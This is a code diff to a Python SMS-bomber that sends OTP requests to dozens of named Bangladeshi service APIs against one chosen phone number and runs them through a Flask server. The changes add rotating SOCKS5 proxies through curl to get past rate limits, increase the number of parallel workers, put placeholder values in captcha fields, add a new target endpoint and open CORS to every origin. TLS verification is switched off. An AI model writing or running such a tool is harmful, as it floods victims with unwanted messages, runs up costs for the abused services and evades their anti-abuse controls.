@@ -4,7 +4,7 @@
       or: python runner.py --server [--port 8080]
 """
 
-import sys, os, json, random, hashlib, time, ssl, string, threading
+import sys, os, json, random, hashlib, time, ssl, string, threading, subprocess
 from urllib.parse import parse_qs, urlparse, quote as urlquote
 import urllib.request, urllib.error
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -27,6 +27,14 @@ CTX = ssl.create_default_context()
 CTX.check_hostname = False
 CTX.verify_mode = ssl.CERT_NONE
 
+# Load proxies
+PROXIES = []
+try:
+    with open('proxy.txt') as f:
+        PROXIES = [l.strip() for l in f if l.strip() and l.strip().startswith('socks5://')]
+except:
+    PROXIES = []
+
 def rn(): return random.choice(FN), random.choice(LN)
 def re(): return f"{''.join(random.choice(EC) for _ in range(random.randint(6,10)))}@{random.choice(DM)}"
 def rp(): return ''.join(random.choice(PC) for _ in range(random.randint(8,12)))
@@ -47,11 +55,42 @@ def fmt_phone(raw):
         pr = raw if raw.startswith('0') else '0' + raw
     return {'raw': pr, 'p880': p8, 'plus': '+' + p8, 'dash': '+88-' + pr}
 
-def http_get(url, headers=None, timeout=4):
+def _curl(url, method='GET', data=None, headers=None, timeout=3, proxy=None):
+    """Use curl subprocess for SOCKS5 proxy support"""
+    cmd = ['curl', '-s', '-X', method, '--max-time', str(timeout), '--connect-timeout', '2']
+    if proxy:
+        cmd += ['--socks5', proxy]
+    if headers:
+        for k, v in headers.items():
+            cmd += ['-H', f'{k}: {v}']
+    if data:
+        cmd += ['--data', data]
+    cmd.append(url)
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
+        return result.stdout, result.returncode
+    except subprocess.TimeoutExpired:
+        return '', 0
+    except:
+        return '', 0
+
+def http_get(url, headers=None, timeout=3, proxy=None):
+    if proxy or PROXIES:
+        p = proxy or (random.choice(PROXIES) if PROXIES else None)
+        out, code = _curl(url, 'GET', None, headers, timeout, p)
+        if code == 0 and out is not None:
+            return out
+        # fallback to direct
     req = urllib.request.Request(url, headers=headers or {}, method='GET')
     return urllib.request.urlopen(req, context=CTX, timeout=timeout).read().decode(errors='ignore')
 
-def http_post(url, data=None, headers=None, timeout=4):
+def http_post(url, data=None, headers=None, timeout=3, proxy=None):
+    if proxy or PROXIES:
+        p = proxy or (random.choice(PROXIES) if PROXIES else None)
+        out, code = _curl(url, 'POST', data, headers, timeout, p)
+        if code == 0 and out is not None:
+            return out
+        # fallback to direct
     b = data.encode() if isinstance(data, str) else data
     req = urllib.request.Request(url, data=b, headers=headers or {}, method='POST')
     return urllib.request.urlopen(req, context=CTX, timeout=timeout).read().decode(errors='ignore')
@@ -61,7 +100,7 @@ def preflight(url, extra_hdrs=None):
     if extra_hdrs:
         h.update(extra_hdrs)
     try:
-        return http_get(url, h, 4)
+        return http_get(url, h, 3)
     except:
         return ''
 
@@ -366,7 +405,12 @@ def build_request(api, phone):
             h['x-device-type'] = 'Mobile'
         elif api == 'shajgoj':
             url = 'https://bk.shajgoj.com/api/customers/send-otp'
-            body = json.dumps({"recaptcha": "placeholder", "phone": p8})
+            body = json.dumps({"phone": pr, "altcha": "placeholder"})
+            h = {'Content-Type': 'application/json', 'Accept': 'application/json', 'User-Agent': UA, 'Origin': 'https://bk.shajgoj.com'}
+        elif api == 'walifier':
+            url = 'https://mobile.wafilife.com/api/mobile/send-otp'
+            body = json.dumps({"mobile": pp})
+            h = {'Content-Type': 'application/json', 'Accept': 'application/json', 'User-Agent': UA, 'Origin': 'https://mobile.wafilife.com'}
         elif api == 'iqralive':
             url = f'https://apibeta.iqra-live.com/api/v2/sent-otp/{pr}'
             body = ''
@@ -442,7 +486,7 @@ def build_request(api, phone):
             body = json.dumps({"phone_number": pr})
             h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'User-Agent': UA, 'Origin': 'https://amarbay.com', 'Referer': 'https://amarbay.com/'}
         elif api == 'rhombus':
-            url = 'https://www.rhombuspublications.com/api/auth/send-otp'
+            url = 'https://www.rhombuspublications.com/api/auth/exists'
             body = json.dumps({"cred": pr})
             h = {'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json', 'User-Agent': 'Dart/3.10 (dart:io)'}
         elif api == 'toffee':
@@ -508,10 +552,9 @@ def build_request(api, phone):
             h = {'Content-Type': 'application/json', 'Accept': 'application/json',
                  'User-Agent': 'Dart/3.5 (dart:io)'}
         elif api == 'udvash':
-            url = f'https://online.udvash-unmesh.com/Registration?nickName={urllib.urlencode(fN)}&mobileNumber={p8}'
-            body = ''
-            method = 'GET'
-            h = {'User-Agent': UA, 'Accept': 'text/html', 'Origin': 'https://online.udvash-unmesh.com', 'Referer': 'https://online.udvash-unmesh.com/'}
+            url = 'https://umsdmpreact-2.udvash-unmesh.com/webapi/Account/Registration/InitializeOtp'
+            body = json.dumps({"nickName": fN, "mobileNumber": p8, "returnUrl": "https://umsdmpreact-2.udvash-unmesh.com", "isResendOtp": False})
+            h = {'Content-Type': 'application/json', 'Accept': 'application/json', 'User-Agent': UA, 'Origin': 'https://umsdmpreact-2.udvash-unmesh.com'}
     except Exception as e:
         return None
 
@@ -526,10 +569,10 @@ APIS = [
     'cinespot','edutubebd','propertywala','bengalmeat_otp','perfumeshop','bookhouse',
     'watchzonebd','telicall','bdjob','chorcha','epharma','jachail','pbazaar','iscreen',
     'rabbithole','medeasy','jatri','shajgoj','iqralive','quizgiri','ghorerbazar','pathao','garibook','shadhin','khaasfood',
-    'suzuki','biddabari','karobar','packly','carrybee_verify','carrybee_register','eziclick','livemcq','timezonebd','shaddho','udvash','amarbay','rhombus','toffee','apcom','ieducation','brritto','edgecourse','shopbase','jamakapor','quizbd','shukhee','smartsohay','shikhosms'
+    'suzuki','biddabari','karobar','packly','carrybee_verify','carrybee_register','eziclick','livemcq','timezonebd','shaddho','udvash','amarbay','rhombus','toffee','apcom','ieducation','brritto','edgecourse','shopbase','jamakapor','quizbd','shukhee','smartsohay','shikhosms','walifier'
 ]
 
-MAX_WORKERS = 50
+MAX_WORKERS = 80
 
 try:
     from flask import Flask, request, jsonify
@@ -544,9 +587,9 @@ def call_api(api, phone):
     t0 = time.time()
     try:
         if req['method'] == 'GET':
-            http_get(req['url'], req['headers'], 5)
+            http_get(req['url'], req['headers'], 3)
         else:
-            http_post(req['url'], req['body'], req['headers'], 5)
+            http_post(req['url'], req['body'], req['headers'], 3)
         status = 200
     except urllib.error.HTTPError as e:
         status = e.code
@@ -678,6 +721,40 @@ def start_flask(port=8080):
             'total_hits': len(APIS) * rounds,
             'msg': f'Started! {len(APIS) * rounds} SMS'
         })
+
+    @app.route('/check', methods=['POST'])
+    def check_apis():
+        phone_str = request.json.get('phone', '') if request.is_json else request.form.get('phone', '')
+        key = request.args.get('key', '') or (request.json.get('key', '') if request.is_json else '')
+        if key != SECRET:
+            resp = jsonify({'error': 'Wrong key'})
+            resp.headers['Access-Control-Allow-Origin'] = '*'
+            return resp, 403
+        if not phone_str or len(phone_str) < 11:
+            resp = jsonify({'error': 'Invalid phone'})
+            resp.headers['Access-Control-Allow-Origin'] = '*'
+            return resp, 400
+
+        phone = fmt_phone(phone_str)
+        results = fire_round(phone)
+        results.sort(key=lambda x: x['api'])
+
+        resp = jsonify({
+            'phone': phone_str,
+            'total': len(results),
+            'ok': sum(1 for r in results if 200 <= r['status'] < 300),
+            'fail': sum(1 for r in results if r['status'] == 0 or r['status'] < 200 or r['status'] >= 300),
+            'results': results
+        })
+        resp.headers['Access-Control-Allow-Origin'] = '*'
+        return resp
+
+    @app.after_request
+    def add_cors(response):
+        response.headers['Access-Control-Allow-Origin'] = '*'
+        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
+        response.headers['Access-Control-Allow-Methods'] = 'GET,POST,OPTIONS'
+        return response
 
     print(f"\n  Flask Server: http://0.0.0.0:{port}")
     print(f"  APIs: {len(APIS)} | Workers: {MAX_WORKERS}")
